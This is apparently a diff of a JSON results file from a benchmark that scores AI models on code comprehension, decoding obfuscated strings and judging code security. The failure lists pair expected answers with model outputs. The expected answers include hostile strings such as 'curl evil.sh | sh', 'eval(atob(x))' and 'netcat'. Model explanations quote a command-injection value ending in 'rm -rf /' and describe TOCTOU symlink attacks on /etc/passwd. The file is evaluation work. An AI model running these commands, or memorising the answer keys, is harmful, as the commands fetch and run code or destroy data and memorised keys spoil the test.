@@ -1,39 +1,15 @@
 {
  "agg": {
-  "GLM-5.1 (FPT AI)": {
-   "code_comprehension": 1.0,
-   "obfuscation": 1.0,
-   "security_reasoning": 1.0,
-   "code_comprehension_hard": 1.0,
-   "obfuscation_hard": 0.8888888888888888,
-   "security_reasoning_hard": 0.9
-  },
-  "GLM-5.1 (Opencode Go)": {
-   "code_comprehension": 0.75,
-   "obfuscation": 1.0,
-   "security_reasoning": 1.0,
-   "code_comprehension_hard": 1.0,
-   "obfuscation_hard": 0.8888888888888888,
-   "security_reasoning_hard": 0.9
-  },
-  "Qwen3.6-27B (FPT AI)": {
-   "code_comprehension": 1.0,
-   "obfuscation": 1.0,
-   "security_reasoning": 1.0,
-   "code_comprehension_hard": 0.875,
-   "obfuscation_hard": 0.8888888888888888,
-   "security_reasoning_hard": 0.9
-  },
   "claude-opus-4-7 (Opencode Zen)": {
    "code_comprehension": 0.75,
    "obfuscation": 1.0,
    "security_reasoning": 1.0,
    "code_comprehension_hard": 1.0,
    "obfuscation_hard": 0.5555555555555556,
-   "security_reasoning_hard": 0.9
+   "security_reasoning_hard": 1.0
   },
   "claude-opus-4-8 (Opencode Zen)": {
-   "code_comprehension": 0.25,
+   "code_comprehension": 0.5,
    "obfuscation": 1.0,
    "security_reasoning": 1.0,
    "code_comprehension_hard": 1.0,
@@ -43,13 +19,21 @@
   "deepseek-v4-flash (Opencode Go)": {
    "code_comprehension": 0.75,
    "obfuscation": 1.0,
-   "security_reasoning": 0.75,
+   "security_reasoning": 1.0,
    "code_comprehension_hard": 1.0,
-   "obfuscation_hard": 0.6666666666666666,
+   "obfuscation_hard": 0.7777777777777778,
    "security_reasoning_hard": 0.8
   },
   "deepseek-v4-pro (Opencode Go)": {
-   "code_comprehension": 0.75,
+   "code_comprehension": 1.0,
+   "obfuscation": 1.0,
+   "security_reasoning": 1.0,
+   "code_comprehension_hard": 1.0,
+   "obfuscation_hard": 0.8888888888888888,
+   "security_reasoning_hard": 0.9
+  },
+  "glm-5.1 (Opencode Go)": {
+   "code_comprehension": 1.0,
    "obfuscation": 1.0,
    "security_reasoning": 1.0,
    "code_comprehension_hard": 1.0,
@@ -59,21 +43,21 @@
   "gpt-5.3-codex (Opencode Zen)": {
    "code_comprehension": 0.75,
    "obfuscation": 1.0,
-   "security_reasoning": 0.75,
+   "security_reasoning": 1.0,
    "code_comprehension_hard": 1.0,
-   "obfuscation_hard": 1.0,
-   "security_reasoning_hard": 0.8
+   "obfuscation_hard": 0.6666666666666666,
+   "security_reasoning_hard": 0.9
   },
   "gpt-5.4 (Opencode Zen)": {
-   "code_comprehension": 0.5,
+   "code_comprehension": 0.75,
    "obfuscation": 1.0,
-   "security_reasoning": 0.75,
+   "security_reasoning": 1.0,
    "code_comprehension_hard": 1.0,
-   "obfuscation_hard": 0.8888888888888888,
-   "security_reasoning_hard": 0.8
+   "obfuscation_hard": 0.6666666666666666,
+   "security_reasoning_hard": 0.9
   },
   "gpt-5.5 (Opencode Zen)": {
-   "code_comprehension": 0.75,
+   "code_comprehension": 0.5,
    "obfuscation": 1.0,
    "security_reasoning": 0.75,
    "code_comprehension_hard": 1.0,
@@ -81,12 +65,12 @@
    "security_reasoning_hard": 0.8
   },
   "kimi-k2.6 (Opencode Go)": {
-   "code_comprehension": 0.5,
+   "code_comprehension": 0.75,
    "obfuscation": 1.0,
    "security_reasoning": 1.0,
    "code_comprehension_hard": 1.0,
-   "obfuscation_hard": 1.0,
-   "security_reasoning_hard": 1.0
+   "obfuscation_hard": 0.8888888888888888,
+   "security_reasoning_hard": 0.9
   },
   "qwen3.6-plus (Opencode Go)": {
    "code_comprehension": 1.0,
@@ -97,235 +81,392 @@
    "security_reasoning_hard": 1.0
   },
   "qwen3.7-max (Opencode Go)": {
-   "code_comprehension": 0.75,
+   "code_comprehension": 1.0,
    "obfuscation": 1.0,
    "security_reasoning": 1.0,
    "code_comprehension_hard": 1.0,
-   "obfuscation_hard": 1.0,
+   "obfuscation_hard": 0.8888888888888888,
    "security_reasoning_hard": 1.0
   }
  },
  "extra": {
-  "GLM-5.1 (FPT AI)": {
-   "easy": 1.0,
-   "hard": 0.9296296296296296,
-   "mean_out": 3699,
-   "mean_rsn": 0,
-   "provider": "FPT AI",
-   "status": "ok"
-  },
-  "GLM-5.1 (Opencode Go)": {
-   "easy": 0.9166666666666666,
-   "hard": 0.9296296296296296,
-   "mean_out": 6334,
-   "mean_rsn": 0,
-   "provider": "Opencode Go",
-   "status": "ok"
-  },
-  "Qwen3.6-27B (FPT AI)": {
-   "easy": 1.0,
-   "hard": 0.887962962962963,
-   "mean_out": 9356,
-   "mean_rsn": 0,
-   "provider": "FPT AI",
-   "status": "ok"
-  },
   "claude-opus-4-7 (Opencode Zen)": {
    "easy": 0.9166666666666666,
-   "hard": 0.8185185185185185,
-   "mean_out": 567,
+   "hard": 0.8518518518518517,
+   "mean_out": 671,
    "mean_rsn": 0,
+   "cap_dur": 5.5,
    "provider": "Opencode Zen",
    "status": "ok"
   },
   "claude-opus-4-8 (Opencode Zen)": {
-   "easy": 0.75,
+   "easy": 0.8333333333333334,
    "hard": 0.8888888888888888,
-   "mean_out": 1289,
+   "mean_out": 1178,
    "mean_rsn": 0,
+   "cap_dur": 5.5,
    "provider": "Opencode Zen",
    "status": "ok"
   },
   "deepseek-v4-flash (Opencode Go)": {
-   "easy": 0.8333333333333334,
-   "hard": 0.8222222222222223,
-   "mean_out": 9197,
-   "mean_rsn": 8918,
+   "easy": 0.9166666666666666,
+   "hard": 0.8592592592592593,
+   "mean_out": 7700,
+   "mean_rsn": 7360,
+   "cap_dur": 36.8,
    "provider": "Opencode Go",
    "status": "ok"
   },
   "deepseek-v4-pro (Opencode Go)": {
-   "easy": 0.9166666666666666,
+   "easy": 1.0,
    "hard": 0.9296296296296296,
-   "mean_out": 7851,
-   "mean_rsn": 7586,
+   "mean_out": 10255,
+   "mean_rsn": 9932,
+   "cap_dur": 138.3,
+   "provider": "Opencode Go",
+   "status": "ok"
+  },
+  "glm-5.1 (Opencode Go)": {
+   "easy": 1.0,
+   "hard": 0.9296296296296296,
+   "mean_out": 4298,
+   "mean_rsn": 0,
+   "cap_dur": 198.2,
    "provider": "Opencode Go",
    "status": "ok"
   },
   "gpt-5.3-codex (Opencode Zen)": {
-   "easy": 0.8333333333333334,
-   "hard": 0.9333333333333332,
-   "mean_out": 976,
+   "easy": 0.9166666666666666,
+   "hard": 0.8555555555555555,
+   "mean_out": 388,
    "mean_rsn": 0,
+   "cap_dur": 3.8,
    "provider": "Opencode Zen",
    "status": "ok"
   },
   "gpt-5.4 (Opencode Zen)": {
-   "easy": 0.75,
-   "hard": 0.8962962962962964,
-   "mean_out": 1180,
+   "easy": 0.9166666666666666,
+   "hard": 0.8555555555555555,
+   "mean_out": 443,
    "mean_rsn": 0,
+   "cap_dur": 3.7,
    "provider": "Opencode Zen",
    "status": "ok"
   },
   "gpt-5.5 (Opencode Zen)": {
-   "easy": 0.8333333333333334,
+   "easy": 0.75,
    "hard": 0.9333333333333332,
-   "mean_out": 1139,
-   "mean_rsn": 0,
+   "mean_out": 1510,
+   "mean_rsn": 1106,
+   "cap_dur": 17.8,
    "provider": "Opencode Zen",
    "status": "ok"
   },
   "kimi-k2.6 (Opencode Go)": {
-   "easy": 0.8333333333333334,
-   "hard": 1.0,
-   "mean_out": 7368,
-   "mean_rsn": 0,
+   "easy": 0.9166666666666666,
+   "hard": 0.9296296296296296,
+   "mean_out": 7194,
+   "mean_rsn": 1014,
+   "cap_dur": 266.3,
    "provider": "Opencode Go",
    "status": "ok"
   },
   "qwen3.6-plus (Opencode Go)": {
    "easy": 1.0,
    "hard": 0.9629629629629629,
-   "mean_out": 8116,
-   "mean_rsn": 7648,
+   "mean_out": 10762,
+   "mean_rsn": 7345,
+   "cap_dur": 87.2,
    "provider": "Opencode Go",
    "status": "ok"
   },
   "qwen3.7-max (Opencode Go)": {
-   "easy": 0.9166666666666666,
-   "hard": 1.0,
-   "mean_out": 8264,
-   "mean_rsn": 5038,
+   "easy": 1.0,
+   "hard": 0.9629629629629629,
+   "mean_out": 6985,
+   "mean_rsn": 4346,
+   "cap_dur": 56.3,
    "provider": "Opencode Go",
    "status": "ok"
   }
  },
+ "tooluse": {
+  "glm-5.1 (Opencode Go)": {
+   "provider": "Opencode Go",
+   "samples": 18,
+   "correct": 18,
+   "tool_calls": 38,
+   "failed": 0,
+   "turns": 56,
+   "loop_in": 6019,
+   "loop_out": 3201,
+   "dur": [
+    12.0,
+    17.0
+   ],
+   "tasks": {
+    "tool_use_c2_hard": 1.0,
+    "tool_use_c2": 1.0
+   },
+   "missing_usage": false,
+   "acc": 1.0,
+   "loop_total": 9220,
+   "tok_per_correct": 512,
+   "calls_per_correct": 2.1,
+   "mean_dur": 14.5
+  },
+  "kimi-k2.6 (Opencode Go)": {
+   "provider": "Opencode Go",
+   "samples": 18,
+   "correct": 18,
+   "tool_calls": 35,
+   "failed": 0,
+   "turns": 53,
+   "loop_in": 7087,
+   "loop_out": 6746,
+   "dur": [
+    27.0,
+    21.0
+   ],
+   "tasks": {
+    "tool_use_c2_hard": 1.0,
+    "tool_use_c2": 1.0
+   },
+   "missing_usage": false,
+   "acc": 1.0,
+   "loop_total": 13833,
+   "tok_per_correct": 768,
+   "calls_per_correct": 1.9,
+   "mean_dur": 24.0
+  },
+  "qwen3.7-max (Opencode Go)": {
+   "provider": "Opencode Go",
+   "samples": 18,
+   "correct": 18,
+   "tool_calls": 38,
+   "failed": 0,
+   "turns": 56,
+   "loop_in": 39216,
+   "loop_out": 5518,
+   "dur": [
+    15.0,
+    20.0
+   ],
+   "tasks": {
+    "tool_use_c2_hard": 1.0,
+    "tool_use_c2": 1.0
+   },
+   "missing_usage": false,
+   "acc": 1.0,
+   "loop_total": 44734,
+   "tok_per_correct": 2485,
+   "calls_per_correct": 2.1,
+   "mean_dur": 17.5
+  },
+  "deepseek-v4-pro (Opencode Go)": {
+   "provider": "Opencode Go",
+   "samples": 18,
+   "correct": 18,
+   "tool_calls": 65,
+   "failed": 0,
+   "turns": 82,
+   "loop_in": 14020,
+   "loop_out": 14249,
+   "dur": [
+    39.0,
+    68.0
+   ],
+   "tasks": {
+    "tool_use_c2_hard": 1.0,
+    "tool_use_c2": 1.0
+   },
+   "missing_usage": false,
+   "acc": 1.0,
+   "loop_total": 28269,
+   "tok_per_correct": 1570,
+   "calls_per_correct": 3.6,
+   "mean_dur": 53.5
+  },
+  "qwen3.6-plus (Opencode Go)": {
+   "provider": "Opencode Go",
+   "samples": 18,
+   "correct": 18,
+   "tool_calls": 45,
+   "failed": 0,
+   "turns": 63,
+   "loop_in": 46240,
+   "loop_out": 6495,
+   "dur": [
+    26.0,
+    19.0
+   ],
+   "tasks": {
+    "tool_use_c2_hard": 1.0,
+    "tool_use_c2": 1.0
+   },
+   "missing_usage": false,
+   "acc": 1.0,
+   "loop_total": 52735,
+   "tok_per_correct": 2930,
+   "calls_per_correct": 2.5,
+   "mean_dur": 22.5
+  },
+  "deepseek-v4-flash (Opencode Go)": {
+   "provider": "Opencode Go",
+   "samples": 18,
+   "correct": 18,
+   "tool_calls": 53,
+   "failed": 0,
+   "turns": 68,
+   "loop_in": 10442,
+   "loop_out": 6914,
+   "dur": [
+    22.0,
+    11.0
+   ],
+   "tasks": {
+    "tool_use_c2_hard": 1.0,
+    "tool_use_c2": 1.0
+   },
+   "missing_usage": false,
+   "acc": 1.0,
+   "loop_total": 17356,
+   "tok_per_correct": 964,
+   "calls_per_correct": 2.9,
+   "mean_dur": 16.5
+  },
+  "gpt-5.3-codex (Opencode Zen)": {
+   "provider": "Opencode Zen",
+   "samples": 18,
+   "correct": 18,
+   "tool_calls": 24,
+   "failed": 0,
+   "turns": 42,
+   "loop_in": 15841,
+   "loop_out": 1239,
+   "dur": [
+    22.0,
+    15.0
+   ],
+   "tasks": {
+    "tool_use_c2_hard": 1.0,
+    "tool_use_c2": 1.0
+   },
+   "missing_usage": false,
+   "acc": 1.0,
+   "loop_total": 17080,
+   "tok_per_correct": 949,
+   "calls_per_correct": 1.3,
+   "mean_dur": 18.5
+  },
+  "claude-opus-4-7 (Opencode Zen)": {
+   "provider": "Opencode Zen",
+   "samples": 18,
+   "correct": 18,
+   "tool_calls": 30,
+   "failed": 0,
+   "turns": 48,
+   "loop_in": 63837,
+   "loop_out": 3140,
+   "dur": [
+    30.0,
+    31.0
+   ],
+   "tasks": {
+    "tool_use_c2_hard": 1.0,
+    "tool_use_c2": 1.0
+   },
+   "missing_usage": false,
+   "acc": 1.0,
+   "loop_total": 66977,
+   "tok_per_correct": 3721,
+   "calls_per_correct": 1.7,
+   "mean_dur": 30.5
+  },
+  "gpt-5.4 (Opencode Zen)": {
+   "provider": "Opencode Zen",
+   "samples": 18,
+   "correct": 18,
+   "tool_calls": 29,
+   "failed": 0,
+   "turns": 45,
+   "loop_in": 18074,
+   "loop_out": 1919,
+   "dur": [
+    20.0,
+    13.0
+   ],
+   "tasks": {
+    "tool_use_c2_hard": 1.0,
+    "tool_use_c2": 1.0
+   },
+   "missing_usage": false,
+   "acc": 1.0,
+   "loop_total": 19993,
+   "tok_per_correct": 1111,
+   "calls_per_correct": 1.6,
+   "mean_dur": 16.5
+  },
+  "claude-opus-4-8 (Opencode Zen)": {
+   "provider": "Opencode Zen",
+   "samples": 18,
+   "correct": 18,
+   "tool_calls": 35,
+   "failed": 0,
+   "turns": 53,
+   "loop_in": 36201,
+   "loop_out": 2900,
+   "dur": [
+    34.0,
+    30.0
+   ],
+   "tasks": {
+    "tool_use_c2_hard": 1.0,
+    "tool_use_c2": 1.0
+   },
+   "missing_usage": false,
+   "acc": 1.0,
+   "loop_total": 39101,
+   "tok_per_correct": 2172,
+   "calls_per_correct": 1.9,
+   "mean_dur": 32.0
+  },
+  "gpt-5.5 (Opencode Zen)": {
+   "provider": "Opencode Zen",
+   "samples": 18,
+   "correct": 18,
+   "tool_calls": 37,
+   "failed": 0,
+   "turns": 55,
+   "loop_in": 25009,
+   "loop_out": 3012,
+   "dur": [
+    44.0,
+    36.0
+   ],
+   "tasks": {
+    "tool_use_c2_hard": 1.0,
+    "tool_use_c2": 1.0
+   },
+   "missing_usage": false,
+   "acc": 1.0,
+   "loop_total": 28021,
+   "tok_per_correct": 1557,
+   "calls_per_correct": 2.1,
+   "mean_dur": 40.0
+  }
+ },
  "fails": [
   [
-   "gpt-5.5 (Opencode Zen)",
-   "security_reasoning_hard",
-   "srh-004",
-   "safe",
-   "I",
-   "The path normalization and `os.path.commonpath()` check correctly blocks simple `../` trav"
-  ],
-  [
-   "gpt-5.5 (Opencode Zen)",
-   "security_reasoning_hard",
-   "srh-008",
-   "safe",
-   "I",
-   "Using `subprocess.run()` with a list of arguments and `shell=False` prevents shell metacha"
-  ],
-  [
-   "gpt-5.5 (Opencode Zen)",
-   "security_reasoning",
-   "sr-004",
-   "safe",
-   "I",
-   "Using a list with `subprocess.run(..., shell=False)` prevents classic shell injection like"
-  ],
-  [
-   "gpt-5.4 (Opencode Zen)",
-   "obfuscation_hard",
-   "obh-001",
-   "eval(atob(x))",
-   "I",
-   "I'm sorry, but I cannot assist with that request."
-  ],
-  [
-   "gpt-5.4 (Opencode Zen)",
-   "security_reasoning_hard",
-   "srh-004",
-   "safe",
-   "I",
-   "The path traversal check is **mostly correct against simple `../` and symlink escapes**:"
-  ],
-  [
-   "gpt-5.4 (Opencode Zen)",
-   "security_reasoning_hard",
-   "srh-008",
-   "safe",
-   "I",
-   "Reasoning: `shell=False` with a list prevents classic shell-command injection, so inputs l"
-  ],
-  [
-   "gpt-5.3-codex (Opencode Zen)",
-   "security_reasoning_hard",
-   "srh-004",
-   "safe",
-   "I",
-   "It mitigates **basic `..` traversal** by using `realpath` + `commonpath`, but it is still"
-  ],
-  [
-   "gpt-5.3-codex (Opencode Zen)",
-   "security_reasoning_hard",
-   "srh-008",
-   "safe",
-   "I",
-   "This is **not vulnerable to shell command injection** in the usual sense, because:  - `she"
-  ],
-  [
-   "claude-opus-4-8 (Opencode Zen)",
-   "obfuscation_hard",
-   "obh-001",
-   "eval(atob(x))",
-   "I",
-   ""
-  ],
-  [
-   "claude-opus-4-8 (Opencode Zen)",
-   "obfuscation_hard",
-   "obh-005",
-   "curl evil.sh | sh",
-   "I",
-   ""
-  ],
-  [
-   "claude-opus-4-8 (Opencode Zen)",
-   "obfuscation_hard",
-   "obh-008",
-   "netcat",
-   "I",
-   "noting"
-  ],
-  [
-   "gpt-5.3-codex (Opencode Zen)",
+   "kimi-k2.6 (Opencode Go)",
    "code_comprehension",
    "cc-002",
    "O(n^2)",
    "I",
-   "The time complexity is **O(n\u00b2)**.  There are two nested loops, each running `n` times, so"
+   "O(n\u00b2)"
   ],
   [
-   "claude-opus-4-7 (Opencode Zen)",
-   "security_reasoning_hard",
-   "srh-008",
-   "safe",
-   "I",
-   "The code uses `subprocess.run` with `shell=False` and passes arguments as a list, which pr"
-  ],
-  [
-   "gpt-5.4 (Opencode Zen)",
-   "security_reasoning",
-   "sr-004",
-   "safe",
-   "I",
-   "Reasoning: `subprocess.run([...])` with a list and default `shell=False` is **not vulnerab"
-  ],
-  [
-   "claude-opus-4-7 (Opencode Zen)",
+   "glm-5.1 (Opencode Go)",
    "obfuscation_hard",
    "obh-001",
    "eval(atob(x))",
@@ -333,28 +474,100 @@
    ""
   ],
   [
-   "claude-opus-4-7 (Opencode Zen)",
+   "glm-5.1 (Opencode Go)",
+   "security_reasoning_hard",
+   "srh-004",
+   "safe",
+   "I",
+   "This code attempts to prevent directory traversal by resolving symlinks and checking if the resulting path shares a common base with the intended restricted directory. While it successfully prevents basic path traversal (like using `../`) and blocks pre-existing symlinks pointing outside the base directory, it contains a Time-of-Check to Time-of-Use (TOCTOU) race condition vulnerability.\n\nIf the `user_path` specifies a file or directory path that does not currently exist, `os.path.realpath()` will not resolve any symlinks for the non-existent parts and will simply return the normalized path. Because this path does not yet point outside the base directory, it passes the `commonpath` check. However, an attacker can then create a symlink at that path pointing to a sensitive file (like `/etc/passwd`) in the brief window before the `open()` function is called. When `open()` is executed, it follows the newly created symlink and reads the restricted file.\n\nAdditionally, `base` is not passed through `os.path.realpath()`. If `/srv/files` is itself a symlink, `os.path.realpath` will resolve the path to the actual target directory (e.g., `/var/data`), but `os.path.commonpath` will compare it against the un-resolved `/srv/files`. This results in a logic failure that denies valid requests, though the TOCTOU issue remains the primary security vulnerability.\n\nVERDICT: VULNERABLE"
+  ],
+  [
+   "deepseek-v4-flash (Opencode Go)",
+   "code_comprehension",
+   "cc-004",
+   "yes",
+   "I",
+   "no"
+  ],
+  [
+   "kimi-k2.6 (Opencode Go)",
    "obfuscation_hard",
-   "obh-005",
-   "curl evil.sh | sh",
+   "obh-001",
+   "eval(atob(x))",
    "I",
    ""
   ],
   [
-   "claude-opus-4-7 (Opencode Zen)",
+   "qwen3.6-plus (Opencode Go)",
    "obfuscation_hard",
-   "obh-007",
-   "/bin/sh",
+   "obh-001",
+   "eval(atob(x))",
    "I",
-   "test"
+   "example"
   ],
   [
-   "claude-opus-4-7 (Opencode Zen)",
+   "qwen3.7-max (Opencode Go)",
    "obfuscation_hard",
-   "obh-008",
-   "netcat",
+   "obh-001",
+   "eval(atob(x))",
    "I",
-   "nethic"
+   "eval(atob(/\\`)"
+  ],
+  [
+   "deepseek-v4-flash (Opencode Go)",
+   "obfuscation_hard",
+   "obh-001",
+   "eval(atob(x))",
+   "I",
+   "eval(atob(w))"
+  ],
+  [
+   "deepseek-v4-flash (Opencode Go)",
+   "obfuscation_hard",
+   "obh-009",
+   "passwd",
+   "I",
+   "password"
+  ],
+  [
+   "deepseek-v4-pro (Opencode Go)",
+   "obfuscation_hard",
+   "obh-009",
+   "passwd",
+   "I",
+   "password"
+  ],
+  [
+   "kimi-k2.6 (Opencode Go)",
+   "security_reasoning_hard",
+   "srh-004",
+   "safe",
+   "I",
+   "The code uses `os.path.realpath` to resolve symlinks and `..` components, then verifies the resolved path stays under `/srv/files` with `os.path.commonpath`. This blocks straightforward path traversal via relative or absolute sequences. However, the path validation and the file open are separate, non-atomic operations. An attacker who can modify filesystem entries between the `commonpath` check and the `open()` call\u2014e.g., by swapping a legitimate file for a symlink to `/etc/shadow` or another sensitive file\u2014can bypass the restriction and read arbitrary files. This is a Time-of-Check to Time-of-Use (TOCTOU) race condition.\n\nVERDICT: VULNERABLE"
+  ],
+  [
+   "deepseek-v4-flash (Opencode Go)",
+   "security_reasoning_hard",
+   "srh-004",
+   "safe",
+   "N",
+   "The code takes a user-supplied path (`user_path`), joins it with a hardcoded base (`/srv/files`), then canonicalizes the result with `os.path.realpath`. It then uses `os.path.commonpath` to verify that the resulting canonical path `p` starts with `base`. If not, it raises an error. Finally, it opens the file at `p` for reading.\n\nThe intended protection is to prevent directory traversal: any attempt to access files outside `/srv/files` (e.g., by using `..` or symlinks) should be blocked because the canonical path will fall outside the base, making the common path check fail.\n\n**Vulnerability**: The check is performed on the canonical path at one point in time, but the file system may change **between** the check and the `open()` call. This is a classic time\u2011of\u2011check\u2011to\u2011time\u2011of\u2011use (TOCTOU) race condition. An attacker who can concurrently modify the filesystem (e.g., rename directories, replace a directory with a symlink) can make the path `p` refer to a different location at open time than when `realpath` resolved it. For example:\n1. The server resolves `p = /srv/files/valid/file` (passing the check).\n2. The attacker quickly replaces the directory `/srv/files/valid` with a symlink to `/etc`.\n3. The `open(p)` now follows the symlink and reads an arbitrary file outside the intended base.\n\nNo other path traversal trick bypasses the check if the filesystem is static, but the TOCTOU window can be exploited if the attacker has write access to a component of the resolved path. Therefore, the code is not safe in a concurrent environment.\n\n**VERDICT: VULNERABLE**"
+  ],
+  [
+   "deepseek-v4-flash (Opencode Go)",
+   "security_reasoning_hard",
+   "srh-008",
+   "safe",
+   "I",
+   "The code uses `subprocess.run` with `shell=False`, which prevents shell injection. However, the variable `host` is passed directly as an argument to `ping` without a `--` separator. If `host` starts with a dash (e.g., `-n`, `-c 1000`), it will be interpreted as a `ping` option rather than a target host. This allows an attacker to alter the command\u2019s behavior (e.g., change the packet count, enable flood mode, or cause resource exhaustion), which constitutes an argument injection vulnerability. While `ping` does not directly support arbitrary command execution, the ability to inject options can still lead to denial of service or other unintended outcomes. The proper fix is to insert `\"--\"` before `host` to treat it strictly as a positional argument.\n\nVERDICT: VULNERABLE"
+  ],
+  [
+   "deepseek-v4-pro (Opencode Go)",
+   "security_reasoning_hard",
+   "srh-004",
+   "safe",
+   "I",
+   "The code attempts to prevent path traversal by resolving the user-supplied path with `os.path.realpath` and verifying with `os.path.commonpath` that the result lies under the base directory. However, it suffers from a time-of-check to time-of-use (TOCTOU) race condition: the security check occurs before the file is opened. An attacker who can modify filesystem entries (e.g., symlinks) between the `realpath` call and the `open` call can bypass the check and read arbitrary files outside the intended directory. Additionally, depending on the Python version and the existence of path components, `realpath` with default parameters may not fully resolve non\u2011existent parts, which can further facilitate race\u2011based attacks. This pattern is insecure and vulnerable to path traversal.\n\nVERDICT: VULNERABLE"
   ],
   [
    "gpt-5.4 (Opencode Zen)",
@@ -365,28 +578,60 @@
    "O(n\u00b2)"
   ],
   [
-   "gpt-5.4 (Opencode Zen)",
+   "gpt-5.3-codex (Opencode Zen)",
+   "code_comprehension",
+   "cc-002",
+   "O(n^2)",
+   "I",
+   "The time complexity is **O(n\u00b2)**.\n\nBoth loops each run `n` times, so the total number of iterations is `n * n = n\u00b2`."
+  ],
+  [
+   "gpt-5.3-codex (Opencode Zen)",
+   "obfuscation_hard",
+   "obh-001",
+   "eval(atob(x))",
+   "I",
+   "zhala(atob(Hx))"
+  ],
+  [
+   "gpt-5.3-codex (Opencode Zen)",
+   "obfuscation_hard",
+   "obh-007",
+   "/bin/sh",
+   "I",
+   "Kubernetes"
+  ],
+  [
+   "gpt-5.3-codex (Opencode Zen)",
+   "obfuscation_hard",
+   "obh-008",
+   "netcat",
+   "I",
+   "ne_tc_"
+  ],
+  [
+   "gpt-5.3-codex (Opencode Zen)",
+   "security_reasoning_hard",
+   "srh-004",
+   "safe",
+   "I",
+   "Yes \u2014 this pattern is still vulnerable.\n\n`realpath(join(base, user_path))` + `commonpath` is a good start against basic `../` traversal, but there is a **TOCTOU race** between the check and the `open(p)` call:\n\n1. You validate that `p` resolves under `/srv/files`.\n2. Then, in a separate step, you open by pathname.\n3. An attacker who can modify filesystem entries (e.g., swap a checked file/dir/symlink after validation) may cause `open()` to follow a different target at use time, potentially outside `base`.\n\nSo the check is not atomic with the file open. Safer approaches use directory file descriptors (`openat`-style), `O_NOFOLLOW`, and/or open-then-verify via `fstat` relationships, depending on platform.\n\nVERDICT: VULNERABLE"
+  ],
+  [
+   "gpt-5.5 (Opencode Zen)",
+   "code_comprehension",
+   "cc-002",
+   "O(n^2)",
+   "I",
+   "O(n\u00b2)"
+  ],
+  [
+   "gpt-5.5 (Opencode Zen)",
    "code_comprehension",
    "cc-004",
    "yes",
    "I",
    "No."
-  ],
-  [
-   "gpt-5.5 (Opencode Zen)",
-   "code_comprehension",
-   "cc-002",
-   "O(n^2)",
-   "I",
-   "O(n\u00b2)"
-  ],
-  [
-   "gpt-5.3-codex (Opencode Zen)",
-   "security_reasoning",
-   "sr-004",
-   "safe",
-   "I",
-   "This is **not** vulnerable to classic shell-command injection, because `subprocess.run` is"
   ],
   [
    "claude-opus-4-7 (Opencode Zen)",
@@ -413,12 +658,116 @@
    "3"
   ],
   [
-   "claude-opus-4-8 (Opencode Zen)",
-   "code_comprehension",
-   "cc-004",
-   "yes",
+   "gpt-5.4 (Opencode Zen)",
+   "obfuscation_hard",
+   "obh-001",
+   "eval(atob(x))",
    "I",
-   "No"
+   "zXal(atob(Hx))"
+  ],
+  [
+   "gpt-5.4 (Opencode Zen)",
+   "obfuscation_hard",
+   "obh-007",
+   "/bin/sh",
+   "I",
+   "invalid base64"
+  ],
+  [
+   "gpt-5.4 (Opencode Zen)",
+   "obfuscation_hard",
+   "obh-008",
+   "netcat",
+   "I",
+   "name t"
+  ],
+  [
+   "claude-opus-4-7 (Opencode Zen)",
+   "obfuscation_hard",
+   "obh-001",
+   "eval(atob(x))",
+   "I",
+   ""
+  ],
+  [
+   "claude-opus-4-7 (Opencode Zen)",
+   "obfuscation_hard",
+   "obh-005",
+   "curl evil.sh | sh",
+   "I",
+   ""
+  ],
+  [
+   "claude-opus-4-7 (Opencode Zen)",
+   "obfuscation_hard",
+   "obh-007",
+   "/bin/sh",
+   "I",
+   "Joplin"
+  ],
+  [
+   "claude-opus-4-7 (Opencode Zen)",
+   "obfuscation_hard",
+   "obh-008",
+   "netcat",
+   "I",
+   "nest do"
+  ],
+  [
+   "claude-opus-4-8 (Opencode Zen)",
+   "obfuscation_hard",
+   "obh-001",
+   "eval(atob(x))",
+   "I",
+   ""
+  ],
+  [
+   "claude-opus-4-8 (Opencode Zen)",
+   "obfuscation_hard",
+   "obh-005",
+   "curl evil.sh | sh",
+   "I",
+   ""
+  ],
+  [
+   "claude-opus-4-8 (Opencode Zen)",
+   "obfuscation_hard",
+   "obh-008",
+   "netcat",
+   "I",
+   "nottie"
+  ],
+  [
+   "gpt-5.4 (Opencode Zen)",
+   "security_reasoning_hard",
+   "srh-004",
+   "safe",
+   "I",
+   "Yes.\n\n`realpath(join(base, user_path))` resolves `..` and symlinks, and `commonpath([base, p]) == base` is a standard way to verify that the resolved target stays under `/srv/files`. So this blocks straightforward path traversal like `../../etc/passwd` and symlink escapes at check time.\n\nHowever, this pattern is still vulnerable to a TOCTOU race. The code checks the resolved path first, then later does `open(p)`. An attacker who can modify the filesystem under `/srv/files` can swap a checked file/path component for a symlink after the validation but before `open()`, causing the process to open something outside the base directory. The safety decision and the actual file open are not atomic.\n\nSo the validation logic is good against simple traversal, but not fully secure in the presence of attacker-controlled concurrent filesystem changes.\n\nVERDICT: VULNERABLE"
+  ],
+  [
+   "gpt-5.5 (Opencode Zen)",
+   "security_reasoning_hard",
+   "srh-004",
+   "safe",
+   "I",
+   "The path traversal check is mostly correct against simple `../` traversal and symlink escapes at the time of the check:\n\n- `os.path.join(base, user_path)` anchors relative paths under `/srv/files`.\n- `os.path.realpath(...)` resolves `..` and symlinks.\n- `os.path.commonpath([base, p]) != base` prevents prefix tricks like `/srv/files_evil`.\n\nHowever, there is still a time-of-check/time-of-use race:\n\n```python\np = os.path.realpath(...)\nif os.path.commonpath(...) != base:\n    raise ValueError(\"denied\")\nopen(p).read()\n```\n\nBetween the `realpath`/`commonpath` check and the `open(p)`, an attacker who can modify files or directories under `/srv/files` could replace a checked path component with a symlink pointing outside the allowed directory. `open()` follows symlinks, so it may open a different target than the one that was checked.\n\nThis is especially relevant if `/srv/files` is user-writable or contains attacker-controlled directories.\n\nVERDICT: VULNERABLE"
+  ],
+  [
+   "gpt-5.5 (Opencode Zen)",
+   "security_reasoning_hard",
+   "srh-008",
+   "safe",
+   "I",
+   "The code is **not vulnerable to classic shell command injection**: because it uses `shell=False` and passes arguments as a list, input like:\n\n```python\nhost = \"example.com; rm -rf /\"\n```\n\nwill be passed as a single argument to `ping`, not executed by a shell.\n\nHowever, if `host` is attacker-controlled, it can still be vulnerable to **argument/option injection**. For example, a value beginning with `-` may be interpreted by `ping` as another option rather than as a hostname:\n\n```python\nhost = \"-f\"\nhost = \"-s65507\"\nhost = \"-W0\"\n```\n\nThis can alter the behavior of the `ping` command. To make it safer, validate `host` as a hostname/IP address and/or use an option terminator if supported:\n\n```python\nsubprocess.run([\"ping\", \"-c\", \"1\", \"--\", host], shell=False, check=True)\n```\n\nVERDICT: VULNERABLE"
+  ],
+  [
+   "gpt-5.5 (Opencode Zen)",
+   "security_reasoning",
+   "sr-004",
+   "safe",
+   "I",
